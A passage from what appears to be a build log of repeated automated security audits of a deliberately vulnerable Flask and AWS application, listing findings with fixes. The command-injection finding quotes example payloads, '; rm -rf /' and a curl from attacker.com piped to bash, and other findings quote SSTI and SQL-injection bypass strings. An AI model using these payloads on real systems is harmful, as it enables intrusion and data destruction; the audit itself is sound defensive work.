+2026-08-24T17:55:46.1550621Z **Files:** `./app/config.py`, `./app/routes/auth.py`
+2026-08-24T17:55:46.1551086Z **Severity:** High
+2026-08-24T17:55:46.1551319Z 
+2026-08-24T17:55:46.1551464Z ```python
+2026-08-24T17:55:46.1551969Z # config.py
+2026-08-24T17:55:46.1552398Z SECRET_KEY = "hardcoded-secret-key-123"
+2026-08-24T17:55:46.1552710Z 
+2026-08-24T17:55:46.1552910Z # auth.py
+2026-08-24T17:55:46.1553518Z db_password = "supersecretdbpassword123"
+2026-08-24T17:55:46.1554122Z secret = "jwt-secret-key-hardcoded-2024"
+2026-08-24T17:55:46.1554616Z ```
+2026-08-24T17:55:46.1554807Z 
+2026-08-24T17:55:46.1555215Z Secrets committed to source control are permanently exposed, even after removal, due to git history.
+2026-08-24T17:55:46.1555871Z 
+2026-08-24T17:55:46.1556116Z **Fix:** Load all secrets from environment variables:
+2026-08-24T17:55:46.1556591Z ```python
+2026-08-24T17:55:46.1556941Z import os
+2026-08-24T17:55:46.1557148Z 
+2026-08-24T17:55:46.1557287Z class Config:
+2026-08-24T17:55:46.1557646Z     SECRET_KEY = os.environ["SECRET_KEY"]
+2026-08-24T17:55:46.1558218Z     JWT_SECRET = os.environ["JWT_SECRET"]
+2026-08-24T17:55:46.1558755Z     SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]
+2026-08-24T17:55:46.1559265Z ```
+2026-08-24T17:55:46.1559956Z Use a `.env` file locally (excluded via `.gitignore`) and a secrets manager (e.g., AWS Secrets Manager) in production.
+2026-08-24T17:55:46.1560862Z 
+2026-08-24T17:55:46.1561007Z ---
+2026-08-24T17:55:46.1561271Z 
+2026-08-24T17:55:46.1561525Z ### 6. No Authentication or Authorisation on Any Route
+2026-08-24T17:55:46.1562379Z **Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+2026-08-24T17:55:46.1563005Z **Severity:** High
+2026-08-24T17:55:46.1563232Z 
+2026-08-24T17:55:46.1563991Z Every endpoint — including user deletion, file processing, and template rendering — is completely unauthenticated. Any anonymous request can:
+2026-08-24T17:55:46.1564862Z - List all users and their emails (`GET /users/`)
+2026-08-24T17:55:46.1565501Z - Delete any user (`DELETE /users/delete/<username>`)
+2026-08-24T17:55:46.1566036Z - Delete any file (`DELETE /files/delete/<id>`)
+2026-08-24T17:55:46.1566582Z - Execute server-side templates (see SSTI above)
+2026-08-24T17:55:46.1566922Z 
+2026-08-24T17:55:46.1567230Z **Fix:** Implement a JWT verification decorator and apply it to protected routes:
+2026-08-24T17:55:46.1567858Z ```python
+2026-08-24T17:55:46.1568311Z from functools import wraps
+2026-08-24T17:55:46.1568725Z from flask import request, jsonify
+2026-08-24T17:55:46.1569160Z import jwt
+2026-08-24T17:55:46.1569369Z 
+2026-08-24T17:55:46.1570019Z def require_auth(f):
+2026-08-24T17:55:46.1570379Z     @wraps(f)
+2026-08-24T17:55:46.1570843Z     def decorated(*args, **kwargs):
+2026-08-24T17:55:46.1571512Z         token = request.headers.get("Authorization", "").removeprefix("Bearer ")
+2026-08-24T17:55:46.1572375Z         if not token:
+2026-08-24T17:55:46.1572878Z             return jsonify({"error": "Missing token"}), 401
+2026-08-24T17:55:46.1573365Z         try:
+2026-08-24T17:55:46.1573899Z             payload = jwt.decode(token, os.environ["JWT_SECRET"], algorithms=["HS256"])
+2026-08-24T17:55:46.1574537Z             request.user_id = payload["user_id"]
+2026-08-24T17:55:46.1575075Z         except jwt.ExpiredSignatureError:
+2026-08-24T17:55:46.1575635Z             return jsonify({"error": "Token expired"}), 401
+2026-08-24T17:55:46.1576204Z         except jwt.InvalidTokenError:
+2026-08-24T17:55:46.1576708Z             return jsonify({"error": "Invalid token"}), 401
+2026-08-24T17:55:46.1577206Z         return f(*args, **kwargs)
+2026-08-24T17:55:46.1577643Z     return decorated
+2026-08-24T17:55:46.1577882Z 
+2026-08-24T17:55:46.1578055Z # Apply to routes
+2026-08-24T17:55:46.1578552Z @users_bp.route("/delete/<username>", methods=["DELETE"])
+2026-08-24T17:55:46.1579063Z @require_auth
+2026-08-24T17:55:46.1579415Z def delete_user(username):
+2026-08-24T17:55:46.1579796Z     ...
+2026-08-24T17:55:46.1580123Z ```
+2026-08-24T17:55:46.1580315Z 
+2026-08-24T17:55:46.1580415Z ---
+2026-08-24T17:55:46.1580643Z 
+2026-08-24T17:55:46.1581118Z ### 7. Overly Permissive IAM Policy — Wildcard Administrator Access
+2026-08-24T17:55:46.1581975Z **File:** `./infrastructure/iam-policy.json`
+2026-08-24T17:55:46.1582483Z **Severity:** High
+2026-08-24T17:55:46.1582740Z 
+2026-08-24T17:55:46.1582890Z ```json
+2026-08-24T17:55:46.1583189Z {
+2026-08-24T17:55:46.1583777Z     "Sid": "AdministratorAccess",
+2026-08-24T17:55:46.1584230Z     "Effect": "Allow",
+2026-08-24T17:55:46.1584629Z     "Action": "*",
+2026-08-24T17:55:46.1584969Z     "Resource": "*"
+2026-08-24T17:55:46.1585393Z }
+2026-08-24T17:55:46.1585733Z ```
+2026-08-24T17:55:46.1585923Z 
+2026-08-24T17:55:46.1587042Z This grants full administrator access to every AWS service and resource. The subsequent, more specific statements are entirely redundant. A compromised identity with this policy can exfiltrate data, destroy infrastructure, create backdoor accounts, etc.
+2026-08-24T17:55:46.1588277Z 
+2026-08-24T17:55:46.1588902Z **Fix:** Apply the principle of least privilege. Grant only the specific actions and resources the application actually needs:
+2026-08-24T17:55:46.1589700Z ```json
+2026-08-24T17:55:46.1590003Z {
+2026-08-24T17:55:46.1590400Z     "Sid": "AppSpecificAccess",
+2026-08-24T17:55:46.1590860Z     "Effect": "Allow",
+2026-08-24T17:55:46.1591472Z     "Action": [
+2026-08-24T17:55:46.1592044Z         "s3:GetObject",
+2026-08-24T17:55:46.1592420Z         "s3:PutObject",
+2026-08-24T17:55:46.1592845Z         "s3:ListBucket"
+2026-08-24T17:55:46.1593203Z     ],
+2026-08-24T17:55:46.1593601Z     "Resource": [
+2026-08-24T17:55:46.1594090Z         "arn:aws:s3:::dissertation-bucket",
+2026-08-24T17:55:46.1594555Z         "arn:aws:s3:::dissertation-bucket/*"
+2026-08-24T17:55:46.1595005Z     ]
+2026-08-24T17:55:46.1595329Z }
+2026-08-24T17:55:46.1595686Z ```
+2026-08-24T17:55:46.1595896Z 
+2026-08-24T17:55:46.1596059Z ---
+2026-08-24T17:55:46.1596221Z 
+2026-08-24T17:55:46.1596446Z ### 8. Debug Mode Enabled in Production Entry Point
+2026-08-24T17:55:46.1596953Z **File:** `./run.py`
+2026-08-24T17:55:46.1597318Z **Severity:** High
+2026-08-24T17:55:46.1597558Z 
+2026-08-24T17:55:46.1597708Z ```python
+2026-08-24T17:55:46.1598044Z app.run(debug=True)
+2026-08-24T17:55:46.1598406Z ```
+2026-08-24T17:55:46.1598581Z 
+2026-08-24T17:55:46.1599583Z Flask's debug mode enables the interactive Werkzeug debugger, which allows **arbitrary Python code execution** in the browser if an exception occurs. It also enables auto-reloading and exposes detailed stack traces.
+2026-08-24T17:55:46.1600644Z 
+2026-08-24T17:55:46.1600807Z **Fix:**
+2026-08-24T17:55:46.1601167Z ```python
+2026-08-24T17:55:46.1601573Z if __name__ == "__main__":
+2026-08-24T17:55:46.1602428Z     debug = os.environ.get("FLASK_ENV") == "development"
+2026-08-24T17:55:46.1602994Z     app.run(debug=debug)
+2026-08-24T17:55:46.1603392Z ```
+2026-08-24T17:55:46.1603950Z In production, use a proper WSGI server (e.g., Gunicorn) and never set `debug=True`.
+2026-08-24T17:55:46.1604427Z 
+2026-08-24T17:55:46.1604550Z ---
+2026-08-24T17:55:46.1604749Z 
+2026-08-24T17:55:46.1604979Z ### 9. EC2 Instance Metadata Service (IMDSv1) Enabled
+2026-08-24T17:55:46.1605520Z **File:** `./infrastructure/main.tf`
+2026-08-24T17:55:46.1605973Z **Severity:** High
+2026-08-24T17:55:46.1606192Z 
+2026-08-24T17:55:46.1606345Z ```hcl
+2026-08-24T17:55:46.1606708Z metadata_options {
+2026-08-24T17:55:46.1607142Z     http_tokens = "optional"   # IMDSv1 allowed
+2026-08-24T17:55:46.1607636Z }
+2026-08-24T17:55:46.1607977Z ```
+2026-08-24T17:55:46.1608135Z 
+2026-08-24T17:55:46.1608908Z IMDSv1 is unauthenticated. Any SSRF vulnerability in the application can be used to query `http://169.254.169.254/` and steal IAM credentials attached to the instance role.
+2026-08-24T17:55:46.1609745Z 
+2026-08-24T17:55:46.1609927Z **Fix:** Enforce IMDSv2 (token-required):
+2026-08-24T17:55:46.1610397Z ```hcl
+2026-08-24T17:55:46.1610770Z metadata_options {
+2026-08-24T17:55:46.1611191Z     http_endpoint               = "enabled"
+2026-08-24T17:55:46.1612483Z     http_tokens                 = "required"   # IMDSv2 only
+2026-08-24T17:55:46.1613022Z     http_put_response_hop_limit = 1
+2026-08-24T17:55:46.1613443Z }
+2026-08-24T17:55:46.1613821Z ```
+2026-08-24T17:55:46.1614003Z 
+2026-08-24T17:55:46.1614157Z ---
+2026-08-24T17:55:46.1614316Z 
+2026-08-24T17:55:46.1614508Z ## Medium Vulnerabilities
+2026-08-24T17:55:46.1614791Z 
+2026-08-24T17:55:46.1614913Z ---
+2026-08-24T17:55:46.1615105Z 
+2026-08-24T17:55:46.1615477Z ### 10. Publicly Accessible S3 Bucket
+2026-08-24T17:55:46.1616036Z **File:** `./infrastructure/main.tf`
+2026-08-24T17:55:46.1616459Z **Severity:** Medium
+2026-08-24T17:55:46.1616663Z 
+2026-08-24T17:55:46.1616838Z ```hcl
+2026-08-24T17:55:46.1617314Z resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+2026-08-24T17:55:46.1617892Z     block_public_acls       = false
+2026-08-24T17:55:46.1618372Z     block_public_policy     = false
+2026-08-24T17:55:46.1618809Z     ignore_public_acls      = false
+2026-08-24T17:55:46.1619229Z     restrict_public_buckets = false
+2026-08-24T17:55:46.1619632Z }
+2026-08-24T17:55:46.1619940Z ```
+2026-08-24T17:55:46.1620145Z 
+2026-08-24T17:55:46.1620677Z All four public-access block settings are disabled, making the bucket and its contents potentially world-readable.
+2026-08-24T17:55:46.1621302Z 
+2026-08-24T17:55:46.1621955Z **Fix:** Unless static website hosting is explicitly required, block all public access:
+2026-08-24T17:55:46.1622850Z ```hcl
+2026-08-24T17:55:46.1623238Z block_public_acls       = true
+2026-08-24T17:55:46.1623652Z block_public_policy     = true
+2026-08-24T17:55:46.1624126Z ignore_public_acls      = true
+2026-08-24T17:55:46.1624557Z restrict_public_buckets = true
+2026-08-24T17:55:46.1625005Z ```
+2026-08-24T17:55:46.1625177Z 
+2026-08-24T17:55:46.1625345Z ---
+2026-08-24T17:55:46.1625510Z 
+2026-08-24T17:55:46.1625743Z ### 11. S3 Bucket Without Encryption
+2026-08-24T17:55:46.1626509Z **File:** `./infrastructure/main.tf` — `dissertation-unencrypted-bucket`
+2026-08-24T17:55:46.1627107Z **Severity:** Medium
+2026-08-24T17:55:46.1627353Z 
+2026-08-24T17:55:46.1627993Z The `unencrypted_bucket` resource has no `aws_s3_bucket_server_side_encryption_configuration` block, leaving data stored at rest unencrypted.
+2026-08-24T17:55:46.1628693Z 
+2026-08-24T17:55:46.1629011Z **Fix:** Add server-side encryption (as already done for `secure_bucket`):
+2026-08-24T17:55:46.1629612Z ```hcl
+2026-08-24T17:55:46.1630250Z resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+2026-08-24T17:55:46.1631007Z     bucket = aws_s3_bucket.unencrypted_bucket.id
+2026-08-24T17:55:46.1631492Z     rule {
+2026-08-24T17:55:46.1632247Z         apply_server_side_encryption_by_default {
+2026-08-24T17:55:46.1632755Z             sse_algorithm = "AES256"
+2026-08-24T17:55:46.1633186Z         }
+2026-08-24T17:55:46.1633502Z     }
+2026-08-24T17:55:46.1633804Z }
+2026-08-24T17:55:46.1634187Z ```
+2026-08-24T17:55:46.1634339Z 
+2026-08-24T17:55:46.1634517Z ---
+2026-08-24T17:55:46.1634663Z 
+2026-08-24T17:55:46.1634943Z ### 12. Overly Broad SecretsManager Permissions
+2026-08-24T17:55:46.1635442Z **File:** `./infrastructure/iam-policy.json`
+2026-08-24T17:55:46.1635877Z **Severity:** Medium
+2026-08-24T17:55:46.1636147Z 
+2026-08-24T17:55:46.1636299Z ```json
+2026-08-24T17:55:46.1636612Z {
+2026-08-24T17:55:46.1636956Z     "Sid": "SecretsManagerAccess",
+2026-08-24T17:55:46.1637370Z     "Action": [
+2026-08-24T17:55:46.1637724Z         "secretsmanager:GetSecretValue",
+2026-08-24T17:55:46.1638226Z         "secretsmanager:ListSecrets",
+2026-08-24T17:55:46.1638743Z         "secretsmanager:DeleteSecret"
+2026-08-24T17:55:46.1639187Z     ],
+2026-08-24T17:55:46.1639503Z     "Resource": "*"
+2026-08-24T17:55:46.1639810Z }
+2026-08-24T17:55:46.1640142Z ```
+2026-08-24T17:55:46.1640360Z 
+2026-08-24T17:55:46.1640918Z `DeleteSecret` on `Resource: "*"` allows deletion of any secret in the account. `ListSecrets` exposes the names and metadata of all secrets.
+2026-08-24T17:55:46.1641608Z 
+2026-08-24T17:55:46.1642238Z **Fix:** Scope to specific secret ARNs and remove destructive permissions:
+2026-08-24T17:55:46.1642824Z ```json
+2026-08-24T17:55:46.1643126Z {
+2026-08-24T17:55:46.1643508Z     "Sid": "SecretsManagerAccess",
+2026-08-24T17:55:46.1644003Z     "Action": ["secretsmanager:GetSecretValue"],
+2026-08-24T17:55:46.1644720Z     "Resource": "arn:aws:secretsmanager:eu-west-2:123456789012:secret:dissertation/*"
+2026-08-24T17:55:46.1645324Z }
+2026-08-24T17:55:46.1645618Z ```
+2026-08-24T17:55:46.1646091Z 
+2026-08-24T17:55:46.1646218Z ---
+2026-08-24T17:55:46.1646424Z 
+2026-08-24T17:55:46.1646599Z ### 13. No Input Validation on File Upload
+2026-08-24T17:55:46.1647253Z **File:** `./app/routes/files.py` — `upload_file()`
+2026-08-24T17:55:46.1647782Z **Severity:** Medium
+2026-08-24T17:55:46.1647989Z 
+2026-08-24T17:55:46.1648135Z ```python
+2026-08-24T17:55:46.1648555Z filename = data.get("filename")
+2026-08-24T17:55:46.1649061Z file_record = File(filename=filename, uploaded_by=uploaded_by)
+2026-08-24T17:55:46.1649554Z ```
+2026-08-24T17:55:46.1649759Z 
+2026-08-24T17:55:46.1650570Z No validation is performed on `filename`. This enables path traversal strings (`../../etc/passwd`) to be stored in the database and later used in the command injection sink in `process_file()`.
+2026-08-24T17:55:46.1651447Z 
+2026-08-24T17:55:46.1651603Z **Fix:**
+2026-08-24T17:55:46.1652193Z ```python
+2026-08-24T17:55:46.1652520Z import re
+2026-08-24T17:55:46.1653064Z from pathlib import Path
+2026-08-24T17:55:46.1653340Z 
+2026-08-24T17:55:46.1653549Z filename = data.get("filename", "")
+2026-08-24T17:55:46.1654060Z # Reject path traversal and shell metacharacters
+2026-08-24T17:55:46.1654720Z if not re.match(r'^[\w\-. ]+$', filename) or Path(filename).name != filename:
+2026-08-24T17:55:46.1655331Z     return jsonify({"error": "Invalid filename"}), 400
+2026-08-24T17:55:46.1655802Z ```
+2026-08-24T17:55:46.1656007Z 
+2026-08-24T17:55:46.1656161Z ---
+2026-08-24T17:55:46.1656323Z 
+2026-08-24T17:55:46.1656556Z ### 14. Missing Input Validation on Auth Endpoints
+2026-08-24T17:55:46.1657318Z **File:** `./app/routes/auth.py` — `register()`
+2026-08-24T17:55:46.1657765Z **Severity:** Medium
+2026-08-24T17:55:46.1657983Z 
+2026-08-24T17:55:46.1658145Z ```python
+2026-08-24T17:55:46.1658493Z data = request.get_json()
+2026-08-24T17:55:46.1658933Z username = data.get("username")
+2026-08-24T17:55:46.1659393Z password = data.get("password")
+2026-08-24T17:55:46.1659828Z email = data.get("email")
+2026-08-24T17:55:46.1660319Z # No null checks, no length limits, no format validation
+2026-08-24T17:55:46.1661208Z user = User(username=username, *** email=email)
+2026-08-24T17:55:46.1661960Z ```
+2026-08-24T17:55:46.1662164Z 
+2026-08-24T17:55:46.1662781Z Missing validation allows null values, excessively long strings (potential DoS), and malformed emails to be inserted into the database.
+2026-08-24T17:55:46.1663495Z 
+2026-08-24T17:55:46.1663625Z **Fix:**
+2026-08-24T17:55:46.1663958Z ```python
+2026-08-24T17:55:46.1664353Z if not username or not password or not email:
+2026-08-24T17:55:46.1664949Z     return jsonify({"error": "All fields are required"}), 400
+2026-08-24T17:55:46.1665527Z if len(username) > 80 or len(password) > 128:
+2026-08-24T17:55:46.1666037Z     return jsonify({"error": "Input too long"}), 400
+2026-08-24T17:55:46.1666543Z if not re.match(r'^[^@]+@[^@]+\.[^@]+$', email):
+2026-08-24T17:55:46.1667045Z     return jsonify({"error": "Invalid email"}), 400
+2026-08-24T17:55:46.1667553Z ```
+2026-08-24T17:55:46.1667757Z 
+2026-08-24T17:55:46.1667926Z ---
+2026-08-24T17:55:46.1668086Z 
+2026-08-24T17:55:46.1668273Z ## Low Vulnerabilities
+2026-08-24T17:55:46.1668502Z 
+2026-08-24T17:55:46.1668651Z ---
+2026-08-24T17:55:46.1668860Z 
+2026-08-24T17:55:46.1669045Z ### 15. JWT Secret Separate from Flask Secret Key
+2026-08-24T17:55:46.1669575Z **File:** `./app/routes/auth.py`
+2026-08-24T17:55:46.1670017Z **Severity:** Low
+2026-08-24T17:55:46.1670199Z 
+2026-08-24T17:55:46.1671175Z Two different hardcoded secrets exist (`SECRET_KEY` in config and `jwt-secret-key-hardcoded-2024` in auth). Beyond the hardcoding issue (covered above), having an undocumented second secret makes rotation and auditing harder.
+2026-08-24T17:55:46.1672418Z 
+2026-08-24T17:55:46.1673196Z **Fix:** Use a single secret loaded from the app config: `current_app.config["SECRET_KEY"]`.
+2026-08-24T17:55:46.1673746Z 
+2026-08-24T17:55:46.1673951Z ---
+2026-08-24T17:55:46.1674115Z 
+2026-08-24T17:55:46.1674331Z ### 16. Sensitive Data Exposure via User Listing
+2026-08-24T17:55:46.1675224Z **File:** `./app/routes/users.py` — `get_all_users()`
+2026-08-24T17:55:46.1675716Z **Severity:** Low
+2026-08-24T17:55:46.1675935Z 
+2026-08-24T17:55:46.1676100Z ```python
+2026-08-24T17:55:46.1676553Z @users_bp.route("/", methods=["GET"])
+2026-08-24T17:55:46.1676975Z def get_all_users():
+2026-08-24T17:55:46.1677388Z     users = User.query.all()
+2026-08-24T17:55:46.1677967Z     return jsonify([{"id": u.id, "username": u.username, "email": u.email, "role": u.role} ...])
+2026-08-24T17:55:46.1678588Z ```
+2026-08-24T17:55:46.1678812Z 
+2026-08-24T17:55:46.1679153Z An unauthenticated caller can enumerate all usernames, emails, and roles in the system.
+2026-08-24T17:55:46.1679632Z 
+2026-08-24T17:55:46.1680121Z **Fix:** Require authentication (see issue #6) and consider whether bulk user enumeration should be an available operation at all.
+2026-08-24T17:55:46.1680789Z 
+2026-08-24T17:55:46.1680957Z ---
+2026-08-24T17:55:46.1681157Z 
+2026-08-24T17:55:46.1681293Z ## Summary Table
+2026-08-24T17:55:46.1681657Z 
+2026-08-24T17:55:46.1682079Z | # | File | Issue | Severity |
+2026-08-24T17:55:46.1682554Z |---|------|-------|----------|
+2026-08-24T17:55:46.1682964Z | 1 | `auth.py` | SQL Injection in login | **Critical** |
+2026-08-24T17:55:46.1683604Z | 2 | `templates.py` | Server-Side Template Injection | **Critical** |
+2026-08-24T17:55:46.1684208Z | 3 | `files.py` | OS Command Injection | **Critical** |
+2026-08-24T17:55:46.1684801Z | 4 | `auth.py` | Plaintext password storage | **Critical** |
+2026-08-24T17:55:46.1685323Z | 5 | `config.py`, `auth.py` | Hardcoded secrets | **High** |
+2026-08-24T17:55:46.1685952Z | 6 | All routes | No authentication/authorisation | **High** |
+2026-08-24T17:55:46.1686661Z | 7 | `iam-policy.json` | Wildcard IAM administrator access | **High** |
+2026-08-24T17:55:46.1687305Z | 8 | `run.py` | Debug mode in production | **High** |
+2026-08-24T17:55:46.1687927Z | 9 | `main.tf` | IMDSv1 enabled on EC2 | **High** |
+2026-08-24T17:55:46.1688510Z | 10 | `main.tf` | Public S3 bucket | **Medium** |
+2026-08-24T17:55:46.1689128Z | 11 | `main.tf` | Unencrypted S3 bucket | **Medium** |
+2026-08-24T17:55:46.1689834Z | 12 | `iam-policy.json` | Overly broad Secrets Manager perms | **Medium** |
+2026-08-24T17:55:46.1690470Z | 13 | `files.py` | No filename validation | **Medium** |
+2026-08-24T17:55:46.1691112Z | 14 | `auth.py` | No input validation on registration | **Medium** |
+2026-08-24T17:55:46.1691859Z | 15 | `auth.py` | Redundant JWT secret | **Low** |
+2026-08-24T17:56:46.8891182Z | 16 | `users.py` | Unauthenticated user enumeration | **Low** |
+2026-08-24T17:56:46.8891641Z 
+2026-08-24T17:56:46.8892089Z === RUN 2 OF 5 ===
+2026-08-24T17:56:46.8892706Z # Security Audit Report
+2026-08-24T17:56:46.8892924Z 
+2026-08-24T17:56:46.8893138Z ## Critical Vulnerabilities
+2026-08-24T17:56:46.8893415Z 
+2026-08-24T17:56:46.8893541Z ---
+2026-08-24T17:56:46.8893806Z 
+2026-08-24T17:56:46.8893994Z ### 1. SQL Injection
+2026-08-24T17:56:46.8894773Z **File:** `./app/routes/auth.py` — `login()` function
+2026-08-24T17:56:46.8895334Z **Severity:** Critical
+2026-08-24T17:56:46.8895549Z 
+2026-08-24T17:56:46.8895747Z ```python
+2026-08-24T17:56:46.8896108Z # VULNERABLE
+2026-08-24T17:56:46.8896760Z query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+2026-08-24T17:56:46.8897489Z result = db.session.execute(query)
+2026-08-24T17:56:46.8897962Z ```
+2026-08-24T17:56:46.8898130Z 
+2026-08-24T17:56:46.8899098Z Raw string concatenation of user input directly into a SQL query allows an attacker to manipulate the query logic entirely. For example, a username of `' OR '1'='1' --` would bypass authentication completely.
+2026-08-24T17:56:46.8899968Z 
+2026-08-24T17:56:46.8900154Z **Fix:** Use parameterised queries:
+2026-08-24T17:56:46.8900653Z ```python
+2026-08-24T17:56:46.8901049Z from sqlalchemy import text
+2026-08-24T17:56:46.8901298Z 
+2026-08-24T17:56:46.8902337Z user = User.query.filter_by(username=username, ***
+2026-08-24T17:56:46.8902859Z # Or with raw SQL if needed:
+2026-08-24T17:56:46.8903942Z query = text("SELECT * FROM users WHERE username = :username AND password = :password")
+2026-08-24T17:56:46.8904768Z result = db.session.execute(query, {"username": username, "password": password})
+2026-08-24T17:56:46.8905397Z ```
+2026-08-24T17:56:46.8905557Z 
+2026-08-24T17:56:46.8905710Z ---
+2026-08-24T17:56:46.8905899Z 
+2026-08-24T17:56:46.8906064Z ### 2. Server-Side Template Injection (SSTI)
+2026-08-24T17:56:46.8906926Z **File:** `./app/routes/templates.py` — `render_template_custom()`
+2026-08-24T17:56:46.8907815Z **Severity:** Critical
+2026-08-24T17:56:46.8908029Z 
+2026-08-24T17:56:46.8908209Z ```python
+2026-08-24T17:56:46.8908534Z # VULNERABLE
+2026-08-24T17:56:46.8908859Z env = Environment()
+2026-08-24T17:56:46.8909352Z template = env.from_string(template_str)  # template_str is raw user input
+2026-08-24T17:56:46.8909869Z rendered = template.render(**context)
+2026-08-24T17:56:46.8910317Z ```
+2026-08-24T17:56:46.8910467Z 
+2026-08-24T17:56:46.8910850Z A Jinja2 `Environment` with no sandboxing allows arbitrary code execution. An attacker can send:
+2026-08-24T17:56:46.8912039Z ```
+2026-08-24T17:56:46.8912405Z {{ ''.__class__.__mro__[1].__subclasses__() }}
+2026-08-24T17:56:46.8912946Z {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+2026-08-24T17:56:46.8913505Z ```
+2026-08-24T17:56:46.8913658Z 
+2026-08-24T17:56:46.8914289Z **Fix:** Use Jinja2's `SandboxedEnvironment`, and even then treat this feature as high-risk. Consider removing user-controlled template rendering entirely:
+2026-08-24T17:56:46.8915213Z ```python
+2026-08-24T17:56:46.8915622Z from jinja2.sandbox import SandboxedEnvironment
+2026-08-24T17:56:46.8915966Z 
+2026-08-24T17:56:46.8916129Z env = SandboxedEnvironment()
+2026-08-24T17:56:46.8916611Z template = env.from_string(template_str)
+2026-08-24T17:56:46.8917095Z rendered = template.render(**context)
+2026-08-24T17:56:46.8917557Z ```
+2026-08-24T17:56:46.8917768Z 
+2026-08-24T17:56:46.8917893Z ---
+2026-08-24T17:56:46.8918102Z 
+2026-08-24T17:56:46.8918276Z ### 3. OS Command Injection
+2026-08-24T17:56:46.8918963Z **File:** `./app/routes/files.py` — `process_file()`
+2026-08-24T17:56:46.8919440Z **Severity:** Critical
+2026-08-24T17:56:46.8919664Z 
+2026-08-24T17:56:46.8919841Z ```python
+2026-08-24T17:56:46.8920176Z # VULNERABLE
+2026-08-24T17:56:46.8920545Z result = subprocess.run(
+2026-08-24T17:56:46.8921038Z     "file " + filename,  # filename is raw user input
+2026-08-24T17:56:46.8921666Z     shell=True,          # shell=True makes this exploitable
+2026-08-24T17:56:46.8922747Z     capture_output=True,
+2026-08-24T17:56:46.8923149Z     text=True
+2026-08-24T17:56:46.8923500Z )
+2026-08-24T17:56:46.8923843Z ```
+2026-08-24T17:56:46.8924041Z 
+2026-08-24T17:56:46.8924766Z `shell=True` with unsanitised user input allows arbitrary command execution. A filename of `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)` would execute on the server.
+2026-08-24T17:56:46.8925651Z 
+2026-08-24T17:56:46.8926003Z **Fix:** Pass arguments as a list and never use `shell=True` with user input:
+2026-08-24T17:56:46.8926627Z ```python
+2026-08-24T17:56:46.8926970Z import shlex
+2026-08-24T17:56:46.8927201Z 
+2026-08-24T17:56:46.8927370Z # Validate filename first
+2026-08-24T17:56:46.8927824Z if not filename or '/' in filename or '..' in filename:
+2026-08-24T17:56:46.8928430Z     return jsonify({"error": "Invalid filename"}), 400
+2026-08-24T17:56:46.8928759Z 
+2026-08-24T17:56:46.8928942Z result = subprocess.run(
+2026-08-24T17:56:46.8929378Z     ["file", filename],  # List form, no shell interpolation
+2026-08-24T17:56:46.8930058Z     shell=False,
+2026-08-24T17:56:46.8930351Z     capture_output=True,
+2026-08-24T17:56:46.8930658Z     text=True
+2026-08-24T17:56:46.8930919Z )
+2026-08-24T17:56:46.8931163Z ```
+2026-08-24T17:56:46.8931264Z 
+2026-08-24T17:56:46.8931434Z ---
+2026-08-24T17:56:46.8931579Z 
+2026-08-24T17:56:46.8931914Z ### 4. Plaintext Password Storage
+2026-08-24T17:56:46.8932381Z **File:** `./app/routes/auth.py` — `register()`
+2026-08-24T17:56:46.8932774Z **Severity:** Critical
+2026-08-24T17:56:46.8932944Z 
+2026-08-24T17:56:46.8933076Z ```python
+2026-08-24T17:56:46.8933334Z # VULNERABLE
+2026-08-24T17:56:46.8934410Z user = User(username=username, *** email=email)
+2026-08-24T17:56:46.8934742Z ```
+2026-08-24T17:56:46.8934919Z 
+2026-08-24T17:56:46.8935244Z Passwords are stored in plaintext in the database. A database breach exposes every user's password directly.
+2026-08-24T17:56:46.8935602Z 
+2026-08-24T17:56:46.8935798Z **Fix:** Hash passwords with `bcrypt` or `werkzeug.security`:
+2026-08-24T17:56:46.8936167Z ```python
+2026-08-24T17:56:46.8936539Z from werkzeug.security import generate_password_hash, check_password_hash
+2026-08-24T17:56:46.8936839Z 
+2026-08-24T17:56:46.8936980Z # On registration:
+2026-08-24T17:56:46.8937440Z user = User(username=username, *** email=email)
+2026-08-24T17:56:46.8937640Z 
+2026-08-24T17:56:46.8937772Z # On login:
+2026-08-24T17:56:46.8938104Z user = User.query.filter_by(username=username).first()
+2026-08-24T17:56:46.8938504Z if user and check_password_hash(user.password, password):
+2026-08-24T17:56:46.8938983Z     token = generate_token(user.id)
+2026-08-24T17:56:46.8939293Z ```
+2026-08-24T17:56:46.8939408Z 
+2026-08-24T17:56:46.8939532Z ---
+2026-08-24T17:56:46.8939704Z 
+2026-08-24T17:56:46.8939825Z ## High Vulnerabilities
+2026-08-24T17:56:46.8940563Z 
+2026-08-24T17:56:46.8940655Z ---
+2026-08-24T17:56:46.8940798Z 
+2026-08-24T17:56:46.8940941Z ### 5. Hardcoded Secrets
+2026-08-24T17:56:46.8941267Z **Files:** `./app/config.py`, `./app/routes/auth.py`
+2026-08-24T17:56:46.8941605Z **Severity:** High
+2026-08-24T17:56:46.8941923Z 
+2026-08-24T17:56:46.8942035Z ```python
+2026-08-24T17:56:46.8942280Z # config.py
+2026-08-24T17:56:46.8942540Z SECRET_KEY = "hardcoded-secret-key-123"
+2026-08-24T17:56:46.8942802Z 
+2026-08-24T17:56:46.8942929Z # auth.py
+2026-08-24T17:56:46.8943204Z db_password = "supersecretdbpassword123"
+2026-08-24T17:56:46.8943966Z secret = "jwt-secret-key-hardcoded-2024"
+2026-08-24T17:56:46.8944281Z ```
+2026-08-24T17:56:46.8944429Z 
+2026-08-24T17:56:46.8945068Z Secrets committed to source control are permanently exposed — even if later removed, they remain in git history. Anyone with repository access can forge JWT tokens or access the database.
+2026-08-24T17:56:46.8945680Z 
+2026-08-24T17:56:46.8945851Z **Fix:** Load all secrets from environment variables:
+2026-08-24T17:56:46.8946204Z ```python
+2026-08-24T17:56:46.8946462Z import os
+2026-08-24T17:56:46.8946609Z 
+2026-08-24T17:56:46.8946708Z class Config:
+2026-08-24T17:56:46.8946963Z     SECRET_KEY = os.environ["SECRET_KEY"]
+2026-08-24T17:56:46.8947335Z     JWT_SECRET = os.environ["JWT_SECRET"]
+2026-08-24T17:56:46.8947707Z     SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]
+2026-08-24T17:56:46.8948096Z ```
